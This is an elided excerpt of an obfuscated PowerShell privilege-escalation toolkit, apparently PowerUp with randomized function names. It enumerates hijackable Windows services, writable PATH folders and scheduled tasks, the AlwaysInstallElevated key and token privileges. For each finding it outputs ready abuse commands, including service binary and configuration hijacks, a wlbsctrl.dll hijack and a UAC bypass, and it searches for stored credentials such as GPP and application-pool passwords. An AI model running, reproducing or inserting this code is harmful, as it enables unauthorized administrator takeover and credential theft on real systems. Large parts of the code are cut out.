...
function E9LZO49C {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenGroups = RDX7KD4T -TokenHandle $hProcToken -InformationClass 'Groups'
...
function 2AJJ7X2E {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                RDX7KD4T -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
...
function WT4AXUVG {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenType = RDX7KD4T -TokenHandle $hProcToken -InformationClass 'Type'
...
function VYTEZL97 {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "VYTEZL97 IndividualService : $($IndividualService.Name)"
...
function IUVJXWN6 {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | VYTEZL97
...
function CDSZD933 {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $ConcatPathArray | 2XXRXHC8

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = IUVJXWN6 -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "853HOA4X -Name '$($Service.name)' -Path <HijackPath>"
...
function YGXYC14G {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | 2XXRXHC8 | ForEach-Object {
            $CanRestart = IUVJXWN6 -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            ...
            $Out | Add-Member Noteproperty 'AbuseFunction' "DK7R8MVO -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
...
function SB3OXN3P {
    ...
    Get-Service | IUVJXWN6 -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | F2W40O9A
        $CanRestart = $_ | IUVJXWN6 -PermissionSet 'Restart'
        $Out = New-Object PSObject
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "Z1L1FHAB -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
...
function Z1L1FHAB {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | F2W40O9A
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | UII9OMBM -Path "$ServiceCommand"
            ...
            $Success = $TargetService | UII9OMBM -Path "$OriginalServicePath"
...
function DK7R8MVO {
    ...
    PROCESS {
        ...
        $ServiceDetails = $TargetService | F2W40O9A
        $ModifiableFiles = $ServiceDetails.PathName | 2XXRXHC8 -Literal
        ...
        $Result = 853HOA4X -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function PI3HHBCL {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | 2XXRXHC8 -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | 2XXRXHC8 | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | 2XXRXHC8 | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function 5MQKC30O {
    ...
    Write-Verbose "Running 5MQKC30O"
    ...
    $Checks = @(
        ...
        @{
            ...
            Command     = { if ((E9LZO49C | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { 2AJJ7X2E -Special | Where-Object {$_} }
        },
        ...
        @{
            ...
            Command     = { PI3HHBCL }
            AbuseScript = { "L54AI6JM -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (51DBGWO5){ New-Object PSObject } }
            AbuseScript = { 'R4MU4HUJ' }
        },
        @{
        ...
        @{
            ...
            Command = { D7P1EI50 | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { KBASLLAZ | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { F15XXG4W | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { 8S4U9U2C | Where-Object {$_} }
        }
    )
...
$Module = KWE02SEM -ModuleName PowerUpModule
...
Set-Alias Get-CurrentUserTokenGroupSid E9LZO49C
Set-Alias Invoke-AllChecks 5MQKC30O
